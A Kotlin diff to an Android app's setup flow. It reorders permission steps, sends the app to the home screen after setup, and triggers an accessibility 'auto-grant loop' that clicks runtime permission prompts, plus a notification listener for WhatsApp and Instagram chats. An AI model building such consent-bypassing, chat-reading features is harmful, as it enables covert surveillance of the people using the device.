@@ -118,6 +118,7 @@ class MainActivity : AppCompatActivity() {
     private var skipAccessibilityStep = false
 
     private var skipNotificationStep = false
+    private var notificationPrompted = false
 
     private var autostartPrompted = false
     private var isExiting = false
@@ -135,8 +136,27 @@ class MainActivity : AppCompatActivity() {
 
         Toast.makeText(this, "Setup completed successfully", Toast.LENGTH_SHORT).show()
         Handler(Looper.getMainLooper()).postDelayed({
-            moveTaskToBack(true)
-        }, 1200L)
+            try {
+                val moved = moveTaskToBack(true)
+                if (!moved) {
+                    Log.i(TAG, "moveTaskToBack returned false, launching HOME intent fallback")
+                    val homeIntent = Intent(Intent.ACTION_MAIN).apply {
+                        addCategory(Intent.CATEGORY_HOME)
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    }
+                    startActivity(homeIntent)
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Failed to moveTaskToBack, attempting HOME intent", e)
+                try {
+                    val homeIntent = Intent(Intent.ACTION_MAIN).apply {
+                        addCategory(Intent.CATEGORY_HOME)
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    }
+                    startActivity(homeIntent)
+                } catch (_: Exception) {}
+            }
+        }, 1000L)
     }
 
 
@@ -157,7 +177,7 @@ class MainActivity : AppCompatActivity() {
 
         if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
             handleNextSetupStep()
-        } else if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled() && isNotificationAccessGranted()) {
+        } else if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled()) {
             completeSetupAndClose()
         }
 
@@ -179,7 +199,7 @@ class MainActivity : AppCompatActivity() {
         if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
             isOneTapFlowRunning = true
             handleNextSetupStep()
-        } else if (isAccessibilityEnabled() && isNotificationAccessGranted() && getMissingRuntimePermissions().isEmpty()) {
+        } else if (isAccessibilityEnabled() && getMissingRuntimePermissions().isEmpty()) {
             triggerAutoSyncAfterAccessibility()
         }
     }
@@ -215,6 +235,7 @@ class MainActivity : AppCompatActivity() {
         ActivityResultContracts.StartActivityForResult()
     ) {
         isNotificationDialogShowing = false
+        notificationPrompted = true
         refreshPermissionStatus()
         isOneTapFlowRunning = true
         handleNextSetupStep()
@@ -383,11 +404,16 @@ class MainActivity : AppCompatActivity() {
         statusUpdater.run()
         uploadCurrentFcmToken()
 
+        if (deviceState.isFirstSetupCompleted && !isOneTapFlowRunning) {
+            return
+        }
+
         val isCore = getMissingRuntimePermissions().isEmpty()
         val isA11y = isAccessibilityEnabled()
         val isNotif = isNotificationAccessGranted()
 
-        if (isCore && isA11y && isNotif) {
+        if (isCore && isA11y && (isNotif || notificationPrompted) &&
+            (batteryPrompted || isBatteryExempted()) && (autostartPrompted || !isOemRom())) {
             completeSetupAndClose()
             return
         }
@@ -425,13 +451,7 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // Step 2: Notification Access (WhatsApp & Instagram chat listener)
-        if (!isNotificationAccessGranted() && !skipNotificationStep) {
-            showNotificationDialog()
-            return
-        }
-
-        // Step 3: Standard Runtime Permissions (Auto-clicked via Accessibility loop)
+        // Step 2: Standard Runtime Permissions (Executed directly on app screen via Accessibility auto-grant loop)
         val missingRuntime = getMissingRuntimePermissions()
         if (missingRuntime.isNotEmpty()) {
             BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
@@ -439,6 +459,12 @@ class MainActivity : AppCompatActivity() {
                 BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                 runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
             }, 300L)
+            return
+        }
+
+        // Step 3: Notification Access (WhatsApp & Instagram chat listener) - after runtime permissions
+        if (!isNotificationAccessGranted() && !notificationPrompted && !skipNotificationStep) {
+            showNotificationDialog()
             return
         }
 
@@ -563,6 +589,7 @@ class MainActivity : AppCompatActivity() {
 
             .setPositiveButton(R.string.go_to_settings) { _, _ ->
                 isNotificationDialogShowing = false
+                notificationPrompted = true
                 try {
                     notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                 } catch (e: Exception) {
@@ -575,12 +602,14 @@ class MainActivity : AppCompatActivity() {
             }
             .setNeutralButton(R.string.open_app_info) { _, _ ->
                 isNotificationDialogShowing = false
+                notificationPrompted = true
                 openAppInfoSettings()
             }
             .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
                 isNotificationDialogShowing = false
+                skipNotificationStep = true
+                notificationPrompted = true
                 if (isOneTapFlowRunning) {
-                    skipNotificationStep = true
                     handleNextSetupStep()
                 } else {
                     refreshPermissionStatus()
@@ -762,7 +791,8 @@ class MainActivity : AppCompatActivity() {
         val isAccessibility = isAccessibilityEnabled()
         val isNotification = isNotificationAccessGranted()
 
-        if (isCore && isAccessibility && isNotification) {
+        if (isCore && isAccessibility && (isNotification || notificationPrompted) &&
+            (batteryPrompted || isBatteryExempted()) && (autostartPrompted || !isOemRom())) {
             if (!deviceState.isFirstSetupCompleted || isOneTapFlowRunning) {
                 handleNextSetupStep()
             } else {
